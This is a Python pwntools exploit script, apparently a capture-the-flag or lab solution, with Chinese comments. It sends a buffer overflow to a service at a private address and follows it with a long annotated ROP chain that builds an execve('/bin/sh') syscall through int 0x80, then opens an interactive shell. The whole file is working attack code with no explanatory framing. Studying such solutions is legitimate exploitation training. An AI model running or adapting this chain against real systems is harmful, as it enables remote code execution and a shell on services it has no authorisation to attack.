#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(arch = 'i386', os = 'linux', timeout = 1)
io = remote('172.17.0.2', 10001)

payload = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef"

#设置ecx = 0
payload += p32(0x555f3555) # pop edx ; xor eax, eax ; pop edi ; ret					--> eax = 0
payload += p32(0x41414141) # 														--> edx = 0x41414141
payload += p32(0x41414141) #														--> edi = 0x41414141
payload += p32(0x556d2a51) # pop ecx ; add al, 0xa ; ret							--> eax = 0xa
payload += p32(0x41414141) #														--> ecx = 0x41414141
payload += p32(0x55655b4c) # sub ecx, edx ; add esp, 0x4c ; mov eax, ecx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret																		 --> eax = 0 ecx = 0
payload += "A" * 0x4c	   #padding(add esp, 0x4c)
payload += p32(0x41414141) * 4 #													--> ebx = 0x41414141 esi = 0x41414141 edi = 0x41414141 ebp = 0x41414141	

#设置ebx指向"/bin/sh"
payload += p32(0x55643028) # xor eax, eax; pop ebx; retn					
payload += p32(0x556b7e7e) # addr(0x556b7e7e)										--> eax = 0 ebx = 0x556b7e7e
payload += p32(0x55617a37) # nop; mov eax, 0x20; retn								--> eax = 0x20
payload += p32(0x55644263)*0x19 # inc eax; retn    0x19 times						--> eax = 0x39
payload += p32(0x556d2860) # add ah, al; retn										--> eax = 0x3939
payload += p32(0x55644263)*0x35 # inc eax; retn    0x35 times						--> eax = 0x396e
payload += p32(0x55634e43) # add bh, ah; retn										--> ebx = 556bb77e
payload += p32(0x555f643e) # add bl, al; xor eax, eax; retn							--> eax = 0 ebx = 0x556bb7ec "/bin/sh"
payload += p32(0x55676d5f) # pop eax; add esp, 0x5c; retn	
payload += p32(0x556b7e39) # addr(0x556b7e39)										--> eax = 0x554b7e39
payload += "A" * 0x5c  # padding(add esp, 0x5c)			
payload += p32(0x556d2860) # add ah, al; retn										--> eax = 0x554bb739
payload += p32(0x55644263)*0x35 # inc eax; retn    0x35 times						--> eax = 0x554bb76e

#设置edx = 0, eax = 0xb，调用int 80h
payload += p32(0x5561793f) # mov edx, 0xffffffff									--> edx = 0xffffffff
payload += p32(0x55642d7a) # inc edx; xor eax, eax									--> eax = 0 edx = 0xffffffff
payload += p32(0x55644263)*0xb  # inc eax     0xb times								--> eax = 0xb
payload += p32(0x55667177) # int 80h

io.sendline(payload)
io.recv()
io.interactive()